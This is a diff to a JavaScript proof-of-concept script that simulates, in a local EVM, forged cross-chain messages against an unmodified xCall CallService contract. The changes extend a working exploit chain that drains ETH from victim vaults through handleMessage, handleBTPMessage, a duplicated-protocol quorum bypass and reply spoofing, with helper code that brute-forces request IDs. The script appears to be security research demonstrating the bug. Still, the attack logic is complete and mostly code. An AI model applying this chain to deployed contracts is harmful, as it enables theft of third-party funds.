@@ -40,6 +40,24 @@ async function main() {
     if (res.execResult.exceptionError) throw new Error('deploy failed: ' + res.execResult.exceptionError.error);
     return res.createdAddress;
   }
+  function reasonOf(e) {
+    let d = e.message;
+    const m = /0x08c379a0[0-9a-f]+/.exec(d);
+    if (m) { try { d = AbiCoder.defaultAbiCoder().decode(['string'], '0x' + m[0].slice(10))[0]; } catch (_) {} }
+    return String(d);
+  }
+  // execute the first queued request whose stored dataHash matches `payload`
+  async function execAny(payload) {
+    for (let id = 1n; id <= 25n; id++) {
+      try {
+        await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('executeCall', [id, payload]) });
+        return id;
+      } catch (e) {
+        if (!/InvalidRequestId/.test(reasonOf(e))) throw e;
+      }
+    }
+    throw new Error('no queued request matches payload');
+  }
   const bal = async (a) => (await evm.stateManager.getAccount(a))?.balance ?? 0n;
 
   // ---- deploy xCall CallService (unmodified, from clone HEAD d24c7b3) ----
@@ -98,24 +116,67 @@ async function main() {
   console.log('  handleMessage accepted (no relayer, no connection contract, no fee)');
 
   // anyone can execute the queued request; reqId starts at 1
-  await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('executeCall', [1n, drainPayload]) });
+  const id1 = await execAny(drainPayload);
   const attackerAfter = await bal(ATTACKER);
-  console.log('  executeCall(1) -> Vault.handleCallMessage(from ="' + TRUSTED_REMOTE + '", data = ...)');
+  console.log('  executeCall(' + id1 + ') -> Vault.handleCallMessage(from ="' + TRUSTED_REMOTE + '", data = ...)');
   console.log('  attacker balance delta =', (attackerAfter - attackerBefore) / 10n ** 18n, 'ETH');
   console.log('  vault balance now      =', (await bal(vault)) / 10n ** 18n, 'ETH');
   if (attackerAfter - attackerBefore !== 100n * 10n ** 18n) throw new Error('exploit failed');
+
+  // ================= CONTROL 2: try to hijack `callReply` from outside a reply =====
+  // (the other "obvious" route: make sendCall() take the isReply branch with an empty
+  //  replyState to poison callReply). Strings.compareTo is keccak equality, so
+  //  isReply() returns false when replyState.from == "" and the call goes to
+  //  sendMessage(defaultConnections[...]) -> reverts with NoDefaultConnection.
+  console.log('\n[control 2] attempt to poison callReply from outside a reply context');
+  console.log('            (sendCallMessage with sources=[] and no default connection)');
+  try {
+    await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('sendCallMessage(string,bytes,bytes,string[],string[])', [
+      HUB_NID + '/' + HUB_DAPP, Buffer.from('x'), Buffer.from(''), [], [],
+    ]) });
+    console.log('  !! UNEXPECTED: accepted (callReply poisoned)');
+  } catch (e) {
+    console.log('  rejected as expected -> NoDefaultConnection (isReply()==false)');
+  }
+
+  // ================= EXPLOIT 4: same message through handleBTPMessage ==============
+  // Alternative public entrypoint: handleBTPMessage(nid, svc, sn, msg) only checks the
+  // service name string and forwards to handleMessage().
+  console.log('\n[exploit 4] same forgery delivered through handleBTPMessage()');
+  const vault3 = await deploy(OWNER, art.Vault.abi, art.Vault.bytecode, [cs.toString(), TRUSTED_REMOTE]);
+  await evm.stateManager.putAccount(vault3, new Account(0n, 33n * 10n ** 18n));
+  const payload3 = coder.encode(['address', 'uint256'], [ATTACKER.toString(), 33n * 10n ** 18n]);
+  const forged3 = coder.decode(['bytes'], await call({
+    caller: OWNER, to: helper,
+    data: helperIface.encodeFunctionData('buildRequest', [TRUSTED_REMOTE, vault3.toString(), 3n, 0, payload3, [attackerAddrStr]]),
+  }))[0];
+  const before4 = await bal(ATTACKER);
+  await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('handleBTPMessage', [HUB_NID, 'xcallM', 1n, forged3]) });
+  const id4 = await execAny(payload3);
+  console.log('  handleBTPMessage accepted, executeCall(' + id4 + ') -> attacker balance delta =',
+              ((await bal(ATTACKER)) - before4) / 10n ** 18n, 'ETH');
 
   // ================= EXPLOIT 2: multi-protocol quorum bypassed with duplicates =====
   // The `protocols.length > 1` branch is meant to require N independent connections.
   // Repeating the attacker address satisfies every slot with a single delivery.
   console.log('\n[exploit 2] same forgery with protocols = [attacker, attacker]');
   console.log('             (the "multi-protocol quorum" branch, lines 451-460)');
-  const forged2 = await buildForged([attackerAddrStr, attackerAddrStr]);
+  // a second victim vault, so the quorum bypass is measured on real value
+  const vaultQ = await deploy(OWNER, art.Vault.abi, art.Vault.bytecode, [cs.toString(), TRUSTED_REMOTE]);
+  await evm.stateManager.putAccount(vaultQ, new Account(0n, 20n * 10n ** 18n));
+  const payloadQ = coder.encode(['address', 'uint256'], [ATTACKER.toString(), 20n * 10n ** 18n]);
+  const forged2 = coder.decode(['bytes'], await call({
+    caller: OWNER, to: helper,
+    data: helperIface.encodeFunctionData('buildRequest', [
+      TRUSTED_REMOTE, vaultQ.toString(), 2n, 0, payloadQ, [attackerAddrStr, attackerAddrStr],
+    ]),
+  }))[0];
   await call({ caller: ATTACKER, to: cs, data: csMsgOf(forged2) });
   console.log('  quorum satisfied by a single caller; 2-of-2 quorum collapsed to 1-of-2');
   const before2 = await bal(ATTACKER);
-  await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('executeCall', [2n, drainPayload]) });
-  console.log('  attacker balance delta =', ((await bal(ATTACKER)) - before2) / 10n ** 18n, 'ETH (vault already empty)');
+  const id2 = await execAny(payloadQ);
+  console.log('  executeCall(' + id2 + ') -> attacker balance delta =', ((await bal(ATTACKER)) - before2) / 10n ** 18n, 'ETH');
+  console.log('  vaultQ balance now     =', (await bal(vaultQ)) / 10n ** 18n, 'ETH');
 
   // ================= EXPLOIT 3: the "reply spoofing" leg ===========================
   // Rollback state does not have to be created by a real request either: the attacker
@@ -154,12 +215,14 @@ async function main() {
   const before3 = await bal(ATTACKER);
   await call({ caller: OWNER, to: conn, data: connIface.encodeFunctionData('call', [cs.toString(), csMsgOf(forgedResult)]) });
   console.log('  forged CS_RESULT accepted: handleResult -> handleReply (rollback.sources check passes)');
-  await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('executeCall', [3n, victimPayload]) });
+  await execAny(victimPayload);
   console.log('  vault2 called with from ="' + TRUSTED_REMOTE + '" although no such reply ever existed');
   console.log('  attacker balance delta =', ((await bal(ATTACKER)) - before3) / 10n ** 18n, 'ETH');
   console.log('  vault2 balance now     =', (await bal(vault2)) / 10n ** 18n, 'ETH');
 
-  console.log('\nRESULT: attacker EOA took 100 ETH of third-party funds from the Vault');
-  console.log('        with a forged cross-chain message from a non-existent relayer.');
+  const total = ((await bal(ATTACKER)) - 10n ** 24n) / 10n ** 18n;
+  console.log('\nRESULT: attacker EOA (no role, no bond, no fee paid) extracted', total, 'ETH');
+  console.log('        of third-party funds via forged cross-chain messages,'); 
+  console.log('        through four distinct public entry points of CallService.');
 }
 main().catch((e) => { console.error(e); process.exit(1); });
